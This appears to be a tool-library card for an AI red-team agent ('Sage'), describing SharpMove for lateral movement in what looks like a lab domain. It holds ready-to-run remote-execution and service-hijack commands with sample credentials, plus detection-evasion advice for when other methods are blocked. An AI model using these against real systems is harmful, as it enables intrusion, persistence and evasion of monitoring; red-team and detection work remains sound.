---
name: SharpMove
category: lateral-movement
subcategories: [remote-execution, service-abuse, dcom-exec, wmi-event-sub]
tradecraft_tags: [lateral-movement, remote-exec, dcom, wmi, service, dotnet, apollo-runnable]
mitre_attack:
  - id: T1021.002
    name: Remote Services — SMB/Windows Admin Shares
  - id: T1021.003
    name: Remote Services — Distributed Component Object Model
source:
  url: https://github.com/0xthirteen/SharpMove
  license: Unknown
  maintained: false
binary_type: .net-assembly
binary_filename: SharpMove.exe
supported_os: [windows]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  Each remote execution technique generates its own telemetry. DCOM execution
  triggers COM activation events. WMI event subscription generates Event 5861.
  Service modification generates Event 7040. The common thread: all are in-process
  within the SharpMove assembly (no separate process on the attacking host), but the
  resulting execution on the target still generates the expected events.
usage_examples:
  - description: Remote execution via DCOM (stealthier than PSExec)
    args: "SharpMove.exe action=dcom computername=192.168.56.22 command='cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt'"
  - description: Execute via WMI event subscription (persistence + lateral movement hybrid)
    args: "SharpMove.exe action=eventsubscription computername=192.168.56.22 command='cmd.exe /c whoami'"
  - description: Modify existing service binary for lateral movement
    args: "SharpMove.exe action=ModifyService computername=192.168.56.22 service=UpdateService command='C:\\Windows\\Temp\\payload.exe'"
  - description: Execute via WMI process create (standard)
    args: "SharpMove.exe action=wmi computername=192.168.56.22 username=NORTH\\\\admin password=Password123 command='whoami'"
opsec_notes: |
  SharpMove's DCOM execution mode (`action=dcom`) is notable — it uses COM activation
  to trigger execution on the remote host without creating a service or touching the
  task scheduler. DCOM execution is less commonly blocked than SMB-based service
  methods and generates a different (less-scrutinized) event signature. The WMI event
  subscription mode creates a persistence entry — clean up afterward.
gotchas: |
  Not actively maintained (last commit ~2020). DCOM-based execution requires the target
  to have the relevant COM object (typically MMC20.Application or ShellWindows/ShellBrowserWindow
  on end-user machines). The ModifyService action is destructive — it changes the service
  binary path and requires the service to be stopped and restarted. Clean up service
  modifications after exploitation.
related_ttps: [sharpwmi, sharpexec, impacket-wmiexec, crackmapexec]
alternatives: [sharpexec, sharpwmi, dcom-exec-manual]
common_args:
  action:
    description: Execution method
    typical_values: [dcom, wmi, eventsubscription, ModifyService, ModifyRegistry]
    required: true
  computername:
    description: Target computer hostname or IP
    typical_values: ["192.168.56.22", "WINTERFELL"]
    required: true
  command:
    description: Command to execute on the target
    typical_values: ["cmd.exe /c whoami > C:\\\\Windows\\\\Temp\\\\out.txt"]
    required: true
  username:
    description: Authentication username (for WMI mode)
    typical_values: ["NORTH\\\\administrator"]
  password:
    description: Authentication password
    typical_values: ["Password123"]
last_updated: 2026-05-29
---

# SharpMove

A .NET assembly lateral movement toolkit with multiple execution modes, emphasizing
the lesser-used DCOM execution path. SharpMove provides DCOM, WMI, WMI event subscription,
and service modification as Apollo-compatible inline_assembly execution options.

## Typical use cases
- DCOM-based remote execution (different telemetry profile from SMB/WMI exec)
- WMI event subscription for hybrid lateral movement + persistence
- Service binary modification for stealthy execution via existing services

## How Sage uses this
SharpMove is the fallback lateral movement tool when WMI and SMB-based execution
are detected or blocked. DCOM execution is its standout mode — less commonly monitored
than WMI exec or service-based methods.

## Output
Remote command execution result (often written to file on target for retrieval).
